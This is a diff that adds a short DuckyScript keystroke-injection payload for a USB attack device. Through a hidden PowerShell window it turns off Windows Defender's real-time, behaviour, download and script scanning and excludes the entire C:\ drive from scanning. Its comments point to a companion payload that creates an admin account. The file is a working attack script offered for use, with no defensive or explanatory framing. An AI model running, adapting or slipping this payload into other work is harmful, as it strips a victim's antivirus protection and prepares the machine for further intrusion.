@@ -1,0 +1,6 @@
+REM Disable Windows Defender real-time protection + tamper protection
+REM Requires admin. Run pt_add_admin.txt first if needed.
+GUI r
+DELAY 800
+STRING powershell -nop -w hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true; Add-MpPreference -ExclusionPath C:\; Write-Host '[+] Defender disabled'"
+ENTER
